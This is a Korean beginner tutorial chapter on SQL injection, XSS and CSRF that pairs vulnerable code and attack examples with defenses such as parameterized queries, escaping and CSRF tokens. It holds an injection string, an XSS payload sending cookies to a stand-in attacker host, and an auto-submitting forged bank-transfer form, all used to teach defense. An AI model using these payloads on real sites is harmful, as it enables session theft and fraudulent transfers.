---
image: "wordcloud.png"
slug: web-vulnerabilities
collection_order: 30
draft: false
title: "[Computer Terms] 웹 취약점: SQL 인젝션, XSS, CSRF"
date: 2026-07-21
last_modified_at: 2026-07-21
categories: ComputerTerms
description: "SQL 인젝션, XSS, CSRF는 웹 애플리케이션에서 가장 흔한 세 가지 취약점입니다. 각 공격이 성립하는 조건과, 파라미터化 쿼리·이스케이핑·CSRF 토큰으로 막는 원리를 코드로 다룹니다."
tags:
- Technology(기술)
- Education(교육)
- Security(보안)
- SQL-Injection(SQL인젝션)
- XSS
- CSRF
- Web(웹)
- OWASP
- SQL
- Reference(참고)
- Documentation(문서화)
- Tutorial(튜토리얼)
- Guide(가이드)
- Beginner
- Computer-Science(컴퓨터과학)
- Fundamentals(기초)
- Best-Practices
- Comparison(비교)
- Deep-Dive
- Case-Study
- Software-Engineering(소프트웨어공학)
- Debugging(디버깅)
- API
---

## 이 장을 읽기 전에

[정규화와 인덱스](/post/computerterms/normalization-and-indexes/)의 SQL, [HTTP와 HTTPS](/post/computerterms/http-and-https/)의 요청·응답 구조, [인증과 인가](/post/computerterms/authentication-and-authorization/)의 세션·쿠키 개념을 안다고 가정한다. 이 챕터는 그 지식을 실제로 어떻게 악용할 수 있는지, 그리고 어떻게 막는지를 다룬다.

## SQL 인젝션: 사용자 입력이 쿼리의 일부가 될 때

[정규화와 인덱스](/post/computerterms/normalization-and-indexes/)에서 SQL을 문자열로 조합해 실행하는 예를 다뤘다. 만약 이 문자열에 사용자 입력을 그대로 이어 붙이면, 사용자가 SQL 문법 자체를 주입해 원래 의도하지 않은 쿼리를 실행시킬 수 있다.

```python
# 취약한 코드: 사용자 입력을 문자열로 그대로 이어 붙임
def find_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# 공격자가 username에 다음을 입력하면:
#   ' OR '1'='1
# 실제 실행되는 쿼리:
#   SELECT * FROM users WHERE username = '' OR '1'='1'
# '1'='1'은 항상 참이므로 WHERE 조건이 무력화되어 테이블의 모든 행이 반환된다
```

이 문제를 막는 표준 해법은 **파라미터화 쿼리(Parameterized Query)**다. 사용자 입력을 쿼리 문자열에 직접 끼워 넣지 않고, 데이터베이스 드라이버에 값으로 별도 전달한다 — 드라이버는 이 값을 절대 SQL 문법으로 해석하지 않는다.

```python
# 안전한 코드: 파라미터화 쿼리
def find_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))   # username은 값으로만 취급됨
```

## XSS: 사용자 입력이 다른 사용자의 페이지에서 실행될 때

**XSS(Cross-Site Scripting)**는 SQL 인젝션과 원리는 비슷하지만 대상이 다르다 — 사용자 입력이 SQL이 아니라 다른 사용자에게 보여지는 HTML/JavaScript의 일부가 될 때 발생한다. 게시판 댓글에 `<script>` 태그를 입력했는데 이를 그대로 다른 사용자의 브라우저에 렌더링하면, 그 스크립트가 다른 사용자의 브라우저에서 실행된다 — 이 스크립트는 [인증과 인가](/post/computerterms/authentication-and-authorization/)에서 다룬 세션 쿠키를 읽어 공격자 서버로 전송하는 등의 공격을 할 수 있다.

```text
공격자가 댓글에 입력: <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

취약한 서버가 이 댓글을 그대로 HTML에 삽입:
  <div class="comment"><script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script></div>

이 댓글을 보는 모든 사용자의 브라우저에서 스크립트가 실행되어 세션 쿠키가 공격자에게 전송된다
```

방어책은 사용자 입력을 HTML로 렌더링하기 전에 **이스케이핑(Escaping)**하는 것이다 — `<`를 `&lt;`로, `>`를 `&gt;`로 바꾸면 브라우저가 이를 태그가 아니라 텍스트 그대로 표시한다. React·Vue 같은 최신 프레임워크는 기본적으로 텍스트 삽입 시 자동 이스케이핑을 적용하지만, `dangerouslySetInnerHTML`(React)처럼 이 보호를 의도적으로 우회하는 API를 쓸 때는 개발자가 직접 이스케이핑 여부를 책임져야 한다.

## CSRF: 로그인된 브라우저의 신뢰를 악용할 때

**CSRF(Cross-Site Request Forgery)**는 SQL 인젝션·XSS와 전혀 다른 원리로 작동한다. 공격자는 취약점을 이용해 코드를 주입하는 것이 아니라, [인증과 인가](/post/computerterms/authentication-and-authorization/)에서 다룬 "쿠키는 요청마다 자동으로 함께 전송된다"는 브라우저의 정상 동작 자체를 악용한다. 사용자가 은행 사이트에 로그인한 상태로 공격자의 악성 페이지를 열면, 그 페이지가 은행 사이트로 몰래 요청을 보낸다 — 브라우저는 이 요청에도 은행 사이트의 쿠키를 자동으로 실어 보내므로, 은행 서버는 이 요청을 실제 로그인한 사용자의 정상 요청으로 착각한다.

```text
공격자 페이지에 숨겨진 폼:
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="공격자계좌">
    <input type="hidden" name="amount" value="1000000">
  </form>
  <script>document.forms[0].submit()</script>   // 페이지 로드 시 자동 제출

사용자가 은행에 로그인된 상태로 이 페이지를 열면,
브라우저가 자동으로 은행 사이트의 세션 쿠키를 실어 요청을 보낸다
```

방어책은 **CSRF 토큰**이다. 서버가 폼을 렌더링할 때 예측 불가능한 무작위 토큰을 함께 내려주고, 실제 요청 제출 시 이 토큰이 함께 오는지 검증한다. 공격자의 페이지는 이 토큰 값을 알 수 없으므로(같은 출처 정책 때문에 은행 사이트의 폼을 직접 읽을 수 없다), 위조된 요청에는 올바른 토큰이 없어 서버가 거부한다.

## 비교: 세 취약점

| 취약점 | 악용 대상 | 방어책 |
|---|---|---|
| SQL 인젝션 | 데이터베이스 쿼리 | 파라미터화 쿼리 |
| XSS | 다른 사용자의 브라우저 렌더링 | 입력 이스케이핑 |
| CSRF | 브라우저의 자동 쿠키 전송 | CSRF 토큰 |

## 흔한 오개념

**"프런트엔드에서 입력을 검증하면 안전하다"** — 프런트엔드 검증은 사용자 경험을 위한 것일 뿐, 공격자는 브라우저를 거치지 않고 서버에 직접 요청을 보낼 수 있다(curl, Postman 등). SQL 인젝션·XSS 방어는 반드시 서버 측(파라미터화 쿼리, 서버 측 이스케이핑)에서 이뤄져야 한다.

**"HTTPS를 쓰면 이 세 취약점이 다 막힌다"** — [HTTP와 HTTPS](/post/computerterms/http-and-https/)에서 다룬 HTTPS는 통신 구간의 도청·변조만 막을 뿐, 애플리케이션 코드 자체의 결함(입력을 검증 없이 쿼리나 HTML에 끼워 넣는 것)은 전혀 막지 못한다. 전송 계층 보안과 애플리케이션 계층 취약점은 완전히 다른 문제다.

## 다른 개념과의 연결

이 세 취약점은 각각 [정규화와 인덱스](/post/computerterms/normalization-and-indexes/)(SQL), [HTTP와 HTTPS](/post/computerterms/http-and-https/)(렌더링·요청), [인증과 인가](/post/computerterms/authentication-and-authorization/)(쿠키·세션)에서 다룬 정상 메커니즘이 검증 없이 쓰일 때 무기가 된다는 공통점을 보여준다. 다음 챕터에서는 이 취약점들을 막는 코드 자체를 어떤 구조로 짜야 하는지, 소프트웨어 설계 갈래의 디자인 패턴으로 이어간다.

## 평가 기준

이 챕터를 읽은 후에는 다음을 할 수 있어야 한다. SQL 인젝션·XSS·CSRF 각각이 어떤 정상 메커니즘을 악용하는지 구분해 설명할 수 있다. 파라미터화 쿼리, 이스케이핑, CSRF 토큰이 각각 어떤 원리로 해당 공격을 막는지 설명할 수 있다. 프런트엔드 검증만으로는 충분하지 않은 이유를 설명할 수 있다.

## 참고 자료

> OWASP Foundation. (2021). *OWASP Top 10:2021*.

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) — SQL 인젝션 공격 패턴과 방어 기법 상세
- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — CSRF 토큰 구현 실무 가이드
